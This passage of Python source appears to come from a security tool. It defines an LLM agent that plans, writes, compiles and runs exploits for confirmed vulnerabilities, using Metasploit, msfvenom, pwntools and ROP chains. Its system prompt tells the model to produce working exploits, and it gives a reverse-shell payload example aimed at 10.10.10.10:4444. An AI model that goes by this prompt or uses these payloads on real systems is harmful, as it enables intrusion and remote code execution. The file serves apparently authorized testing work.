"""MrZeroExploitBuilder - LLM-Powered Weaponizer Agent."""

import asyncio
import json
import re
import shutil
import tempfile
import uuid
from datetime import datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any

from mrzero.agents.base import AgentResult, AgentType, BaseAgent
from mrzero.core.memory.state import AgentState
from mrzero.core.schemas import (
    Exploit,
    EnvironmentInfo,
    Vulnerability,
    VulnerabilityType,
)

if TYPE_CHECKING:
    from mrzero.core.tools_service import ToolsService


class ExploitBuilderAgent(BaseAgent):
    """Agent for building exploits using LLM-driven dynamic analysis.

    This agent uses LLM reasoning as the PRIMARY decision maker for:
    1. Analyzing vulnerabilities and determining exploitation strategy
    2. Generating targeted exploit code (not generic templates)
    3. Using dynamic analysis tools (debuggers, fuzzers) to refine exploits
    4. Iterating based on test results until exploitation succeeds

    The LLM is the brain - tools (pwntools, ROPgadget, GDB, Frida, MCP servers) are its hands.

    ## Available Tool Backends

    ### MCP Servers (via ToolsService)
    - **pwndbg-mcp**: GDB with pwndbg plugin for exploit development
    - **metasploit-mcp**: Metasploit Framework for exploitation
    - **ghidra-mcp**: Binary analysis and reverse engineering
    - **frida-mcp**: Dynamic instrumentation

    ### Local Tools (via bash/subprocess)
    - **pwntools**: Python exploit development framework
    - **ROPgadget**: ROP gadget finder
    - **Frida**: Dynamic instrumentation (also available via MCP)
    - **MSFVenom**: Metasploit payload generator

    ### Fuzzing (placeholder - MCP server needed)
    - **AFL++**: Coverage-guided fuzzer (optional, works without it)
    """

    agent_type = AgentType.EXPLOIT_BUILDER

    SYSTEM_PROMPT = """You are MrZeroExploitBuilder, an elite exploit developer and security researcher specializing in vulnerability weaponization.

## Your Mission
Convert confirmed vulnerabilities into working exploits. You don't use generic templates - you craft TARGETED exploits based on deep analysis of the vulnerability, the target environment, and the specific code paths involved.

## Your Toolkit

You have access to powerful exploitation tools via two mechanisms:

### MCP-Connected Tools (Remote Analysis)
These tools run on external MCP servers. Call them using the provided methods:

1. **pwndbg (GDB + pwndbg)**
   - Purpose: Debugging, memory analysis, ROP gadget finding, crash analysis
   - Method: `_run_pwndbg(command, target=None, pid=None)`
   - Example commands:
     - `vmmap` - View memory mappings
     - `heap` - Heap analysis
     - `telescope $rsp 20` - Examine stack
     - `rop --grep 'pop rdi'` - Find ROP gadgets
     - `checksec` - Check binary protections
     - `x/20gx $rsp` - Examine memory

2. **Metasploit Framework**
   - Purpose: Exploit modules, payload generation, handlers
   - Method: `_run_metasploit(operation, module=None, options=None)`
   - Operations:
     - `search` - Find modules (module="type:exploit platform:linux")
     - `use` - Select module (module="exploit/unix/ftp/vsftpd_234_backdoor")
     - `set` - Set options (options={"RHOSTS": "target", "LPORT": "4444"})
     - `exploit` - Run the exploit
     - `generate` - Generate payload

3. **Ghidra**
   - Purpose: Binary RE, decompilation, function analysis
   - Method: `_run_ghidra(operation, binary_path, **kwargs)`
   - Operations: analyze, decompile, disassemble, functions, xrefs, strings

4. **Frida (MCP)**
   - Purpose: Dynamic instrumentation, hooking, bypass
   - Method: `_run_frida_mcp(operation, target, script=None)`

### Local Tools (Direct Execution)
These run locally via subprocess. Call them using the provided methods:

1. **pwntools**
   - Purpose: Python exploit development framework
   - Method: `_run_pwntools_script(script)`
   - Example:
     ```python
     from pwn import *
     context.arch = 'amd64'
     payload = flat([b'A'*72, p64(pop_rdi), p64(binsh), p64(system)])
     print(payload.hex())
     ```

2. **ROPgadget**
   - Purpose: Find ROP gadgets in binaries
   - Method: `_run_ropgadget(binary_path, options=None)`
   - Options: ["--ropchain"], ["--only", "pop|ret"], ["--depth", "5"]

3. **Frida (Local)**
   - Purpose: Dynamic instrumentation
   - Method: `_run_frida_local(target, script_content=None, trace_pattern=None)`

4. **checksec**
   - Purpose: Check binary security mitigations
   - Method: `_run_checksec(binary_path)`
   - Returns: RELRO, Canary, NX, PIE, FORTIFY status

5. **msfvenom (Payload Generation)**
   - Purpose: Generate shellcode and payloads
   - Method: `_generate_payload(payload_type, lhost, lport, output_format, platform, arch)`
   - Example: `_generate_payload("shell_reverse_tcp", "10.10.10.10", 4444, "python")`

## Exploitation Expertise

### Web Application Exploitation
- **SQL Injection**: Union-based, blind (boolean/time), error-based, stacked queries, out-of-band
- **Command Injection**: Shell metacharacters, argument injection, environment variable manipulation
- **XSS**: DOM-based, reflected, stored, CSP bypass, filter evasion
- **SSRF**: Protocol smuggling, DNS rebinding, cloud metadata exploitation
- **Deserialization**: Java (ysoserial), PHP, Python pickle, .NET, Ruby
- **Path Traversal**: Encoding bypass, null byte injection, symlink attacks
- **Authentication Bypass**: JWT attacks, session fixation, credential stuffing logic

### Binary Exploitation
- **Buffer Overflow**: Stack-based, heap-based, format strings
- **ROP Chain Construction**: Finding gadgets, chaining for shellcode execution
- **Return-to-libc**: Bypassing NX/DEP
- **ASLR Bypass**: Information leaks, partial overwrites, brute force
- **Canary Bypass**: Fork-based brute force, information leaks
- **Heap Exploitation**: Use-after-free, double-free, heap spray

### Smart Contract Exploitation
- **Reentrancy**: Single-function, cross-function, cross-contract
- **Flash Loan Attacks**: Price manipulation, arbitrage
- **Integer Overflow/Underflow**
- **Access Control Bypass**
- **Front-running attacks**

## Exploitation Methodology

### Phase 1: Deep Vulnerability Analysis
- Understand the EXACT vulnerable code path
- Identify what input triggers the vulnerability
- Determine what constraints exist (filters, WAFs, sanitization attempts)
- Map the data flow from input to vulnerable sink

### Phase 2: Environment Analysis
For binary exploits:
1. Run `_run_checksec(binary_path)` to check protections
2. Use `_run_ropgadget(binary_path)` to find gadgets
3. Use `_run_pwndbg("vmmap")` to inspect memory layout

For web exploits:
- Identify WAF/filter behavior
- Map API endpoints and parameters
- Check for security headers

### Phase 3: Exploit Strategy
- Choose the right exploitation technique
- Plan payload delivery mechanism
- If Metasploit has a module, consider: `_run_metasploit("search", module="...")`
- Design shellcode: `_generate_payload(...)` for reliable shellcode

### Phase 4: Exploit Development
- For binary exploits: Use `_run_pwntools_script(script)` to test payloads
- For ROP chains: Use `_run_ropgadget(binary, ["--ropchain"])`
- Include error handling and debugging output

### Phase 5: Testing & Iteration
- Test against the target environment
- If exploit crashes, use `_run_pwndbg("bt")` to analyze
- Refine payloads based on results

## Important Guidelines

1. **TARGETED, NOT GENERIC**: Every exploit should be crafted for the specific vulnerability
2. **USE THE TOOLS**: Call the provided methods to leverage MCP and local tools
3. **CHECK PROTECTIONS FIRST**: Always run checksec before binary exploitation
4. **ITERATE**: If an exploit fails, analyze why and improve
5. **DOCUMENT**: Include comments explaining the exploitation logic
6. **RELIABLE PAYLOADS**: Use msfvenom for shellcode generation"""

    EXPLOIT_STRATEGY_PROMPT = """## Task: Design Exploitation Strategy

Analyze the vulnerability and environment to create a targeted exploitation plan.

---

## Vulnerability Details:

{vulnerability_info}

---

## Target Environment:

{environment_info}

---

## Available Tools:

{available_tools}

---

## Your Task

Design a TARGETED exploitation strategy for this specific vulnerability.

Think step by step:
1. What is the exact vulnerability and how is it triggered?
2. What constraints or protections must be bypassed?
3. What exploitation technique is most appropriate?
4. What tools will you use?
5. What should the exploit achieve? (PoC crash, data exfil, RCE, etc.)

Respond in this exact JSON format:
```json
{{
    "vulnerability_analysis": {{
        "vuln_type": "<specific vulnerability type>",
        "trigger_mechanism": "<how to trigger the vulnerability>",
        "input_vector": "<where malicious input enters>",
        "vulnerable_function": "<specific function/endpoint>",
        "constraints": ["<constraint 1>", "<constraint 2>"],
        "protections_to_bypass": ["<protection 1>", "<protection 2>"]
    }},
    "exploitation_strategy": {{
        "technique": "<chosen exploitation technique>",
        "reasoning": "<why this technique>",
        "goal": "poc_crash" | "data_exfiltration" | "code_execution" | "privilege_escalation",
        "payload_type": "<type of payload needed>",
        "delivery_method": "<how payload will be delivered>"
    }},
    "tool_plan": [
        {{
            "tool": "<tool name>",
            "purpose": "<what we'll use it for>",
            "command_template": "<example command>"
        }}
    ],
    "exploit_steps": [
        {{
            "step": 1,
            "action": "<what to do>",
            "expected_result": "<what success looks like>",
            "fallback": "<what to try if this fails>"
        }}
    ],
    "success_indicators": ["<how we know exploitation succeeded>"],
    "estimated_complexity": "low" | "medium" | "high",
    "requires_interaction": <true|false>
}}
```"""

    EXPLOIT_GENERATION_PROMPT = """## Task: Generate Exploit Code

Based on the exploitation strategy, generate working exploit code.

---

## Vulnerability:

{vulnerability_info}

---

## Exploitation Strategy:

{strategy}

---

## Environment Details:

{environment_info}

---

## Binary Analysis (if applicable):

{binary_analysis}

---

## Your Task

Generate a COMPLETE, WORKING exploit. Not a template - actual exploit code that targets this specific vulnerability.

Requirements:
1. Include all necessary imports
2. Add detailed comments explaining each step
3. Include error handling
4. Add debugging output
5. Make it configurable (target URL/IP, ports, etc.)
6. Include a test/verification function

For binary exploits, use pwntools patterns:
```python
from pwn import *

# Set context
context.binary = './vulnerable_binary'
context.arch = 'amd64'
context.os = 'linux'

# Build payload with pwntools
payload = flat([
    b'A' * offset,
    p64(gadget_address),
    # ... ROP chain
])
```

For web exploits, be specific:
```python
import requests

def exploit(target_url):
    # Specific payload crafted for THIS vulnerability
    payload = "..."  # Not generic - targeted!
    
    response = requests.post(
        f"{{target_url}}/vulnerable/endpoint",
        data={{"param": payload}}
    )
    
    return check_success(response)
```

Respond in this exact JSON format:
```json
{{
    "exploit_code": {{
        "language": "<python|c|solidity|javascript>",
        "filename": "<exploit_name.py>",
        "code": "<the complete exploit code>",
        "dependencies": ["<required packages>"]
    }},
    "usage_instructions": {{
        "setup": ["<setup step 1>", "<setup step 2>"],
        "execution": "<how to run the exploit>",
        "expected_output": "<what successful exploitation looks like>"
    }},
    "payload_details": {{
        "payload": "<the actual payload used>",
        "encoding": "<any encoding applied>",
        "explanation": "<why this payload works>"
    }},
    "verification": {{
        "method": "<how to verify success>",
        "indicators": ["<success indicator 1>", "<indicator 2>"]
    }}
}}
```"""

    EXPLOIT_REFINEMENT_PROMPT = """## Task: Refine Exploit Based on Results

The exploit was tested but didn't fully succeed. Analyze the results and improve it.

---

## Original Exploit:

{original_exploit}

---

## Test Results:

{test_results}

---

## Error Analysis:

{error_analysis}

---

## Your Task

Analyze WHY the exploit failed and generate an improved version.

Consider:
1. Did the payload reach the vulnerable code?
2. Were there filters or protections we didn't account for?
3. Is the target environment different than expected?
4. Do we need a different exploitation technique?

Respond in this exact JSON format:
```json
{{
    "failure_analysis": {{
        "root_cause": "<why it failed>",
        "missed_factors": ["<factor 1>", "<factor 2>"],
        "environment_differences": ["<difference 1>"]
    }},
    "refinement_strategy": {{
        "changes_needed": ["<change 1>", "<change 2>"],
        "new_technique": "<if switching techniques>",
        "payload_modifications": "<how to modify payload>"
    }},
    "improved_exploit": {{
        "language": "<python|c|solidity|javascript>",
        "filename": "<exploit_v2.py>",
        "code": "<the improved exploit code>",
        "changes_made": ["<change 1>", "<change 2>"]
    }},
    "confidence": <0.0-1.0>,
    "should_retry": <true|false>,
    "alternative_approach": "<if should_retry is false, what else to try>"
}}
```"""

    MAX_EXPLOIT_ATTEMPTS = 5

    def __init__(self, llm: Any = None, tools: list[Any] | None = None) -> None:
        """Initialize the ExploitBuilder agent."""
        super().__init__(llm, tools)
        self._available_tools = self._detect_available_tools()
        self._tools_service: "ToolsService | None" = None
        self._tools_service_initialized = False

    async def _get_tools_service(self) -> "ToolsService":
        """Get the initialized tools service (lazy loading).

        Returns:
            Initialized ToolsService instance.
        """
        if not self._tools_service_initialized:
            from mrzero.core.tools_service import get_initialized_tools_service

            self._tools_service = await get_initialized_tools_service()
            self._tools_service_initialized = True
        return self._tools_service  # type: ignore

    def get_system_prompt(self) -> str:
        """Get the system prompt."""
        return self.SYSTEM_PROMPT

    def _detect_available_tools(self) -> dict[str, bool]:
        """Detect which exploitation tools are available on the system."""
        tools = {
            # Binary exploitation
            "pwntools": self._check_python_module("pwn"),
            "ropgadget": shutil.which("ROPgadget") is not None,
            "gdb": shutil.which("gdb") is not None,
            "pwndbg": self._check_gdb_plugin("pwndbg"),
            "objdump": shutil.which("objdump") is not None,
            "readelf": shutil.which("readelf") is not None,
            "checksec": shutil.which("checksec") is not None
            or self._check_python_module("pwnlib.elf"),
            # Web exploitation
            "curl": shutil.which("curl") is not None,
            "sqlmap": shutil.which("sqlmap") is not None,
            "httpie": shutil.which("http") is not None,
            # Dynamic analysis
            "frida": self._check_python_module("frida"),
            "strace": shutil.which("strace") is not None,
            "ltrace": shutil.which("ltrace") is not None,
            # Fuzzing
            "afl": shutil.which("afl-fuzz") is not None,
            "radamsa": shutil.which("radamsa") is not None,
            # General
            "python3": shutil.which("python3") is not None,
            "docker": shutil.which("docker") is not None,
        }
        return tools

    def _check_python_module(self, module_name: str) -> bool:
        """Check if a Python module is available."""
        try:
            __import__(module_name)
            return True
        except ImportError:
            return False

    def _check_gdb_plugin(self, plugin_name: str) -> bool:
        """Check if a GDB plugin is installed."""
        # This is a simplified check
        gdbinit_paths = [
            Path.home() / ".gdbinit",
            Path("/etc/gdb/gdbinit"),
        ]
        for path in gdbinit_paths:
            if path.exists():
                try:
                    content = path.read_text()
                    if plugin_name in content.lower():
                        return True
                except Exception:
                    pass
        return False

    async def execute(self, state: AgentState) -> AgentResult:
        """Execute exploit generation using LLM-driven analysis.

        The LLM is the PRIMARY decision maker for:
        1. Analyzing the vulnerability and choosing exploitation technique
        2. Generating targeted exploit code
        3. Analyzing test results and refining exploits

        Args:
            state: Current workflow state.

        Returns:
            AgentResult with generated exploits.
        """
        target_path = Path(state.target_path)
        vulnerabilities = state.confirmed_vulnerabilities
        environment = state.environment
        exploits: list[Exploit] = []
        errors: list[str] = []
        exploit_history: list[dict] = []

        if not vulnerabilities:
            return AgentResult(
                agent_type=self.agent_type,
                success=False,
                output={"exploits": [], "message": "No vulnerabilities to exploit"},
                errors=["No confirmed vulnerabilities to exploit"],
                next_agent=AgentType.REPORTER,
            )

        # Process each vulnerability
        for vuln in vulnerabilities:
            # In HITL mode, ask before exploiting each vulnerability
            if state.mode.value == "hitl" and exploits:
                return AgentResult(
                    agent_type=self.agent_type,
                    success=True,
                    output={
                        "exploits": exploits,
                        "in_progress": True,
                        "current_vuln": vuln.id,
                    },
                    requires_human_input=True,
                    human_prompt=f"Exploit generated for previous vulnerability. "
                    f"Proceed to exploit {vuln.title}? (yes/no/skip)",
                )

            try:
                exploit_result = await self._exploit_vulnerability(
                    target_path=target_path,
                    vulnerability=vuln,
                    environment=environment,
                    state=state,
                )

                if exploit_result["success"]:
                    exploits.append(exploit_result["exploit"])
                    exploit_history.append(
                        {
                            "vuln_id": vuln.id,
                            "success": True,
                            "attempts": exploit_result["attempts"],
                            "technique": exploit_result.get("technique", "unknown"),
                        }
                    )
                else:
                    errors.append(
                        f"Failed to exploit {vuln.id}: {exploit_result.get('error', 'Unknown error')}"
                    )
                    exploit_history.append(
                        {
                            "vuln_id": vuln.id,
                            "success": False,
                            "attempts": exploit_result["attempts"],
                            "error": exploit_result.get("error", ""),
                        }
                    )

            except Exception as e:
                errors.append(f"Exception exploiting {vuln.id}: {str(e)}")

        # Save exploits to files
        if exploits:
            await self._save_exploits(exploits)

        return AgentResult(
            agent_type=self.agent_type,
            success=len(exploits) > 0,
            output={
                "exploits": exploits,
                "exploit_history": exploit_history,
                "tools_used": [t for t, avail in self._available_tools.items() if avail],
            },
            errors=errors if errors else [],
            next_agent=AgentType.REPORTER,
        )

    async def _exploit_vulnerability(
        self,
        target_path: Path,
        vulnerability: Vulnerability,
        environment: EnvironmentInfo | None,
        state: AgentState,
    ) -> dict[str, Any]:
        """Exploit a single vulnerability using LLM-driven approach.

        Args:
            target_path: Path to the codebase.
            vulnerability: Vulnerability to exploit.
            environment: Target environment info.
            state: Current workflow state.

        Returns:
            Result dict with exploit or error.
        """
        attempts = 0
        current_exploit = None
        test_results = None

        # Step 1: Gather information for LLM
        vuln_info = self._format_vulnerability_info(vulnerability, target_path)
        env_info = self._format_environment_info(environment)
        binary_analysis = await self._analyze_binary_if_applicable(target_path, vulnerability)

        # Step 2: LLM plans exploitation strategy
        strategy = await self._plan_exploitation_strategy(
            vulnerability_info=vuln_info,
            environment_info=env_info,
            available_tools=self._format_available_tools(),
        )

        if not strategy or "error" in strategy:
            error_msg = (
                strategy.get("error", "Failed to plan exploitation strategy")
                if strategy
                else "Failed to plan exploitation strategy"
            )
            return {
                "success": False,
                "attempts": 0,
                "error": error_msg,
            }

        # Step 3: Iterative exploit development
        for attempt in range(1, self.MAX_EXPLOIT_ATTEMPTS + 1):
            attempts = attempt

            if attempt == 1:
                # Generate initial exploit
                exploit_data = await self._generate_exploit(
                    vulnerability_info=vuln_info,
                    strategy=strategy,
                    environment_info=env_info,
                    binary_analysis=binary_analysis,
                )
            else:
                # Refine based on previous results
                exploit_data = await self._refine_exploit(
                    original_exploit=current_exploit,
                    test_results=test_results,
                    error_analysis=self._analyze_exploit_failure(test_results),
                )

            if not exploit_data or "error" in exploit_data:
                continue

            current_exploit = exploit_data

            # Step 4: Test the exploit (if environment available)
            if environment and environment.build_successful:
                test_results = await self._test_exploit(
                    exploit_data=exploit_data,
                    environment=environment,
                    vulnerability=vulnerability,
                )

                if test_results.get("success"):
                    # Exploitation successful!
                    exploit = self._create_exploit_object(
                        vulnerability=vulnerability,
                        exploit_data=exploit_data,
                        tested=True,
                        successful=True,
                        test_output=test_results.get("output", ""),
                    )
                    return {
                        "success": True,
                        "exploit": exploit,
                        "attempts": attempts,
                        "technique": strategy.get("exploitation_strategy", {}).get(
                            "technique", "unknown"
                        ),
                    }

                # Check if LLM says we should stop trying
                if exploit_data.get("should_retry") is False:
                    break
            else:
                # No environment - create untested exploit
                exploit = self._create_exploit_object(
                    vulnerability=vulnerability,
                    exploit_data=exploit_data,
                    tested=False,
                    successful=False,
                    test_output="No environment available for testing",
                )
                return {
                    "success": True,
                    "exploit": exploit,
                    "attempts": attempts,
                    "technique": strategy.get("exploitation_strategy", {}).get(
                        "technique", "unknown"
                    ),
                }

        # Max attempts reached
        if current_exploit:
            exploit = self._create_exploit_object(
                vulnerability=vulnerability,
                exploit_data=current_exploit,
                tested=True,
                successful=False,
                test_output=test_results.get("output", "") if test_results else "",
            )
            return {
                "success": True,  # We have an exploit, just not verified working
                "exploit": exploit,
                "attempts": attempts,
                "technique": strategy.get("exploitation_strategy", {}).get("technique", "unknown"),
                "note": "Exploit generated but not verified successful",
            }

        return {
            "success": False,
            "attempts": attempts,
            "error": "Failed to generate working exploit after max attempts",
        }

    def _format_vulnerability_info(self, vuln: Vulnerability, target_path: Path) -> str:
        """Format vulnerability information for LLM.

        Args:
            vuln: Vulnerability object.
            target_path: Path to codebase.

        Returns:
            Formatted vulnerability info.
        """
        # Get extended code context
        code_context = self._get_extended_code_context(target_path, vuln)

        info = f"""### Vulnerability: {vuln.title}

**ID:** {vuln.id}
**Type:** {vuln.vuln_type.value}
**Severity:** {vuln.severity.value} (Score: {vuln.score})
**Confidence:** {vuln.confidence:.0%}

**Location:**
- File: `{vuln.file_path}`
- Line: {vuln.line_number}

**Description:**
{vuln.description or "No description provided"}

**CWE:** {vuln.cwe_id or "Not specified"}

**Code Snippet:**
```
{vuln.code_snippet or "Not available"}
```

**Extended Code Context:**
```
{code_context}
```
"""

        if vuln.data_flow:
            info += f"""
**Data Flow:**
- Source: `{vuln.data_flow.source}` at {vuln.data_flow.source_file}:{vuln.data_flow.source_line}
- Sink: `{vuln.data_flow.sink}` at {vuln.data_flow.sink_file}:{vuln.data_flow.sink_line}
- Tainted: {vuln.data_flow.tainted}
- Sanitizers: {", ".join(vuln.data_flow.sanitizers) if vuln.data_flow.sanitizers else "None detected"}
"""

        return info

    def _get_extended_code_context(
        self, target_path: Path, vuln: Vulnerability, context_lines: int = 50
    ) -> str:
        """Get extended code context around vulnerable code.

        Args:
            target_path: Path to codebase.
            vuln: Vulnerability.
            context_lines: Lines of context.

        Returns:
            Code context with line numbers.
        """
        try:
            file_path = target_path / vuln.file_path
            if not file_path.exists():
                return "File not found"

            content = file_path.read_text(encoding="utf-8", errors="ignore")
            lines = content.split("\n")

            start = max(0, vuln.line_number - context_lines - 1)
            end = min(len(lines), vuln.line_number + context_lines)

            context_lines_with_numbers = []
            for i in range(start, end):
                line_num = i + 1
                marker = " >>> " if line_num == vuln.line_number else "     "
                context_lines_with_numbers.append(f"{line_num:4d}{marker}{lines[i]}")

            return "\n".join(context_lines_with_numbers)

        except Exception as e:
            return f"Error reading file: {e}"

    def _format_environment_info(self, environment: EnvironmentInfo | None) -> str:
        """Format environment information for LLM.

        Args:
            environment: Environment info object.

        Returns:
            Formatted environment info.
        """
        if not environment:
            return "No environment information available. Exploit will be generated for manual testing."

        info = f"""### Target Environment

**Type:** {environment.env_type}
**Build Status:** {"Successful" if environment.build_successful else "Failed"}
**Build Attempts:** {environment.build_attempts}
"""

        if environment.container_id:
            info += f"**Container ID:** {environment.container_id}\n"
        if environment.connection_port:
            info += f"**Port:** {environment.connection_port}\n"
        if environment.connection_ip:
            info += f"**IP:** {environment.connection_ip}\n"
        if environment.process_id:
            info += f"**PID:** {environment.process_id}\n"
        if environment.build_errors:
            info += f"**Build Errors:** {'; '.join(environment.build_errors)}\n"

        return info

    def _format_available_tools(self) -> str:
        """Format available tools for LLM.

        Returns:
            Formatted tool list.
        """
        available = []
        unavailable = []

        tool_descriptions = {
            "pwntools": "Python exploit development framework",
            "ropgadget": "ROP gadget finder",
            "gdb": "GNU Debugger",
            "pwndbg": "GDB plugin for exploit development",
            "objdump": "Binary disassembler",
            "readelf": "ELF file analyzer",
            "checksec": "Binary security checker",
            "curl": "HTTP client",
            "sqlmap": "SQL injection automation",
            "httpie": "HTTP client",
            "frida": "Dynamic instrumentation",
            "strace": "System call tracer",
            "ltrace": "Library call tracer",
            "afl": "Coverage-guided fuzzer",
            "radamsa": "General-purpose fuzzer",
            "python3": "Python interpreter",
            "docker": "Container runtime",
        }

        for tool, is_available in self._available_tools.items():
            desc = tool_descriptions.get(tool, "")
            if is_available:
                available.append(f"- **{tool}**: {desc}")
            else:
                unavailable.append(f"- {tool}: {desc}")

        result = "### Available Tools\n"
        result += "\n".join(available) if available else "No tools detected"

        if unavailable:
            result += "\n\n### Unavailable Tools (install for better results)\n"
            result += "\n".join(unavailable[:5])  # Limit to 5

        return result

    async def _analyze_binary_if_applicable(self, target_path: Path, vuln: Vulnerability) -> str:
        """Analyze binary if this is a binary exploitation scenario.

        Args:
            target_path: Path to codebase.
            vuln: Vulnerability.

        Returns:
            Binary analysis results.
        """
        # Check if this is likely a binary exploitation scenario
        binary_vuln_types = {
            VulnerabilityType.RCE,
            VulnerabilityType.COMMAND_INJECTION,
            VulnerabilityType.LPE,
        }

        if vuln.vuln_type not in binary_vuln_types:
            return "Not a binary exploitation scenario."

        results = []

        # Look for binary files
        binary_extensions = {".elf", ".exe", ".so", ".dll", ".out", ""}
        binaries = []
        for ext in binary_extensions:
            binaries.extend(target_path.glob(f"*{ext}"))

        if not binaries:
            return "No binary files found in target."

        # Analyze first binary found
        binary = binaries[0]
        results.append(f"**Binary:** {binary.name}")

        # Run checksec if available
        if self._available_tools.get("checksec"):
            checksec_result = await self._run_command(f"checksec --file={binary}", timeout=30)
            if checksec_result["success"]:
                results.append(
                    f"\n**Security Mitigations:**\n```\n{checksec_result['output']}\n```"
                )

        # Run file command
        file_result = await self._run_command(f"file {binary}", timeout=10)
        if file_result["success"]:
            results.append(f"\n**File Type:** {file_result['output'].strip()}")

        # Check for ROP gadgets if ROPgadget available
        if self._available_tools.get("ropgadget"):
            rop_result = await self._run_command(
                f"ROPgadget --binary={binary} --depth=3 | head -50", timeout=60
            )
            if rop_result["success"]:
                results.append(f"\n**Sample ROP Gadgets:**\n```\n{rop_result['output']}\n```")

        return "\n".join(results) if results else "Binary analysis not available."

    async def _plan_exploitation_strategy(
        self,
        vulnerability_info: str,
        environment_info: str,
        available_tools: str,
    ) -> dict[str, Any] | None:
        """Use LLM to plan the exploitation strategy.

        Args:
            vulnerability_info: Formatted vulnerability info.
            environment_info: Formatted environment info.
            available_tools: Available tools list.

        Returns:
            Exploitation strategy dict or None.
        """
        prompt = self.EXPLOIT_STRATEGY_PROMPT.format(
            vulnerability_info=vulnerability_info,
            environment_info=environment_info,
            available_tools=available_tools,
        )

        try:
            response = await self.chat(prompt)
            return self._parse_llm_json_response(response)
        except Exception as e:
            return {"error": str(e)}

    async def _generate_exploit(
        self,
        vulnerability_info: str,
        strategy: dict[str, Any],
        environment_info: str,
        binary_analysis: str,
    ) -> dict[str, Any] | None:
        """Use LLM to generate exploit code.

        Args:
            vulnerability_info: Formatted vulnerability info.
            strategy: Exploitation strategy from LLM.
            environment_info: Formatted environment info.
            binary_analysis: Binary analysis results.

        Returns:
            Exploit data dict or None.
        """
        prompt = self.EXPLOIT_GENERATION_PROMPT.format(
            vulnerability_info=vulnerability_info,
            strategy=json.dumps(strategy, indent=2),
            environment_info=environment_info,
            binary_analysis=binary_analysis,
        )

        try:
            response = await self.chat(prompt)
            return self._parse_llm_json_response(response)
        except Exception as e:
            return {"error": str(e)}

    async def _refine_exploit(
        self,
        original_exploit: dict[str, Any] | None,
        test_results: dict[str, Any] | None,
        error_analysis: str,
    ) -> dict[str, Any] | None:
        """Use LLM to refine exploit based on test results.

        Args:
            original_exploit: Previous exploit attempt.
            test_results: Results from testing.
            error_analysis: Analysis of what went wrong.

        Returns:
            Refined exploit data or None.
        """
        if not original_exploit:
            return None

        prompt = self.EXPLOIT_REFINEMENT_PROMPT.format(
            original_exploit=json.dumps(original_exploit, indent=2),
            test_results=json.dumps(test_results, indent=2) if test_results else "No test results",
            error_analysis=error_analysis,
        )

        try:
            response = await self.chat(prompt)
            result = self._parse_llm_json_response(response)

            # Merge improved exploit into standard format
            if result is not None and "improved_exploit" in result:
                result["exploit_code"] = result["improved_exploit"]

            return result
        except Exception as e:
            return {"error": str(e)}

    def _analyze_exploit_failure(self, test_results: dict[str, Any] | None) -> str:
        """Analyze why an exploit failed.

        Args:
            test_results: Test results dict.

        Returns:
            Analysis string.
        """
        if not test_results:
            return "No test results available."

        analysis_parts = []

        if test_results.get("error"):
            analysis_parts.append(f"**Error:** {test_results['error']}")

        if test_results.get("output"):
            analysis_parts.append(f"**Output:** {test_results['output'][:500]}")

        if test_results.get("return_code") is not None:
            analysis_parts.append(f"**Return Code:** {test_results['return_code']}")

        if test_results.get("timeout"):
            analysis_parts.append("**Timeout:** Exploit execution timed out")

        return "\n".join(analysis_parts) if analysis_parts else "Unknown failure reason."

    async def _test_exploit(
        self,
        exploit_data: dict[str, Any],
        environment: EnvironmentInfo,
        vulnerability: Vulnerability,
    ) -> dict[str, Any]:
        """Test an exploit against the target environment.

        Args:
            exploit_data: Generated exploit data.
            environment: Target environment.
            vulnerability: Target vulnerability.

        Returns:
            Test results dict.
        """
        from mrzero.core.config import get_config

        config = get_config()
        exploit_code = exploit_data.get("exploit_code", {})
        code = exploit_code.get("code", "")
        language = exploit_code.get("language", "python")

        if not code:
            return {"success": False, "error": "No exploit code generated"}

        # Create temporary exploit file
        output_dir = config.output_dir / "exploits" / "test"
        output_dir.mkdir(parents=True, exist_ok=True)

        filename = exploit_code.get("filename", f"exploit_{vulnerability.id}.py")
        exploit_file = output_dir / filename
        exploit_file.write_text(code)

        # Determine how to run the exploit
        if language == "python":
            cmd = f"python3 {exploit_file}"

            # Add target URL if this is a web exploit and environment has port
            if environment.connection_port:
                target_url = f"http://localhost:{environment.connection_port}"
                cmd = f"TARGET_URL={target_url} {cmd}"

        elif language == "c":
            # Compile first
            binary = output_dir / f"exploit_{vulnerability.id}"
            compile_result = await self._run_command(f"gcc -o {binary} {exploit_file}", timeout=30)
            if not compile_result["success"]:
                return {
                    "success": False,
                    "error": f"Compilation failed: {compile_result['error']}",
                }
            cmd = str(binary)

        else:
            return {
                "success": False,
                "error": f"Unsupported language: {language}",
            }

        # Run the exploit
        result = await self._run_command(cmd, timeout=60)

        # Analyze results
        success_indicators = exploit_data.get("verification", {}).get("indicators", [])
        output = result.get("output", "") + result.get("error", "")

        # Check for success indicators
        exploitation_successful = False
        for indicator in success_indicators:
            if indicator.lower() in output.lower():
                exploitation_successful = True
                break

        # Also check common success patterns
        common_success_patterns = [
            "success",
            "shell",
            "pwned",
            "flag{",
            "root:",
            "uid=0",
            "admin",
            "exploited",
        ]
        for pattern in common_success_patterns:
            if pattern in output.lower():
                exploitation_successful = True
                break

        return {
            "success": exploitation_successful,
            "output": output,
            "return_code": result.get("returncode"),
            "timeout": result.get("timeout", False),
        }

    def _create_exploit_object(
        self,
        vulnerability: Vulnerability,
        exploit_data: dict[str, Any],
        tested: bool,
        successful: bool,
        test_output: str,
    ) -> Exploit:
        """Create an Exploit object from LLM-generated data.

        Args:
            vulnerability: Target vulnerability.
            exploit_data: Generated exploit data.
            tested: Whether exploit was tested.
            successful: Whether exploitation succeeded.
            test_output: Output from testing.

        Returns:
            Exploit object.
        """
        exploit_code = exploit_data.get("exploit_code", {})
        code = exploit_code.get("code", "# Exploit generation failed")
        language = exploit_code.get("language", "python")
        filename = exploit_code.get("filename", f"exploit_{vulnerability.id}.py")

        # Build description from exploit data
        description_parts = []

        if exploit_data.get("exploitation_strategy"):
            strategy = exploit_data["exploitation_strategy"]
            description_parts.append(f"Technique: {strategy.get('technique', 'Unknown')}")
            description_parts.append(f"Goal: {strategy.get('goal', 'Unknown')}")

        if exploit_data.get("payload_details"):
            payload = exploit_data["payload_details"]
            description_parts.append(f"Payload: {payload.get('explanation', 'N/A')[:200]}")

        if exploit_data.get("usage_instructions"):
            instructions = exploit_data["usage_instructions"]
            description_parts.append(
                f"Execution: {instructions.get('execution', 'Run the script')}"
            )

        description = "\n".join(description_parts) if description_parts else None

        # Determine exploit type
        exploit_type = "poc"
